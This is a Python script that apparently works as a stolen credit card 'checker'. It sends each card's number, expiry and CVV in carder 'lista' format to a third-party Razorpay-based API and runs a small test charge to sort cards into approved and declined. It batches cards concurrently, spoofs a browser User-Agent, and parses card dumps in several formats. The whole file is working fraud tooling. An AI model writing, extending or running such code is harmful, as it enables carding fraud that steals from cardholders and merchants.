import asyncio
import aiohttp
import re
import os

NYVEXIS_API_URL = "https://api.nyvexis.com/razorpayapi/"
NYVEXIS_API_KEY = os.environ.get("NYVEXIS_API_KEY", "")

async def check_razorpay(card_number, exp_month, exp_year, cvv, amount=10):
    """Check card using Nyvexis Razorpay API"""
    
    card_clean = card_number.replace(' ', '').replace('-', '')
    
    if len(exp_year) == 2:
        exp_year_full = f"20{exp_year}"
    else:
        exp_year_full = exp_year
    
    lista = f"{card_clean}|{exp_month}|{exp_year_full}|{cvv}"
    
    headers = {
        "X-API-Key": NYVEXIS_API_KEY,
        "Accept": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    }
    
    params = {
        "lista": lista,
        "amount": str(amount),
        "siteurl": "NA"
    }
    
    try:
        timeout = aiohttp.ClientTimeout(total=60)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(NYVEXIS_API_URL, headers=headers, params=params) as response:
                response_text = await response.text()
                
                try:
                    result = await response.json()
                    api_message = result.get('message', result.get('msg', response_text))
                except:
                    api_message = response_text
                
                if "payment successful" in str(api_message).lower():
                    return {
                        'status': 'APPROVED',
                        'message': api_message,
                        'card': f"{card_clean}|{exp_month}|{exp_year}|{cvv}",
                        'response': api_message
                    }
                else:
                    return {
                        'status': 'DECLINED',
                        'message': api_message,
                        'card': f"{card_clean}|{exp_month}|{exp_year}|{cvv}",
                        'response': api_message
                    }
                    
    except asyncio.TimeoutError:
        return {
            'status': 'ERROR',
            'message': 'Request timeout',
            'card': f"{card_number}|{exp_month}|{exp_year}|{cvv}",
            'response': 'Timeout'
        }
    except Exception as e:
        return {
            'status': 'ERROR',
            'message': str(e),
            'card': f"{card_number}|{exp_month}|{exp_year}|{cvv}",
            'response': str(e)
        }

async def check_razorpay_batch(cards, amount=10):
    """Check multiple cards in batches with 0.25s delay between batches"""
    results = []
    batch_size = 5
    
    for i in range(0, len(cards), batch_size):
        batch = cards[i:i + batch_size]
        
        tasks = []
        for card in batch:
            task = check_razorpay(
                card['number'],
                card['month'],
                card['year'],
                card['cvv'],
                amount
            )
            tasks.append(task)
        
        batch_results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for j, result in enumerate(batch_results):
            if isinstance(result, Exception):
                results.append({
                    'status': 'ERROR',
                    'message': str(result),
                    'card': f"{batch[j]['number']}|{batch[j]['month']}|{batch[j]['year']}|{batch[j]['cvv']}",
                    'response': str(result)
                })
            else:
                results.append(result)
        
        if i + batch_size < len(cards):
            await asyncio.sleep(0.25)
    
    return results

def parse_card(card_text):
    if not card_text:
        return None
    
    patterns = [
        r'(\d{15,16})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})',
        r'(\d{15,16})/(\d{1,2})/(\d{2,4})/(\d{3,4})',
        r'(\d{15,16}):(\d{1,2}):(\d{2,4}):(\d{3,4})',
        r'(\d{15,16})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})',
    ]
    
    for pattern in patterns:
        match = re.search(pattern, card_text)
        if match:
            cc, mm, yy, cvv = match.groups()
            if len(yy) == 2:
                yy = '20' + yy
            return {
                'number': cc,
                'month': mm.zfill(2),
                'year': yy,
                'cvv': cvv,
            }
    
    return None
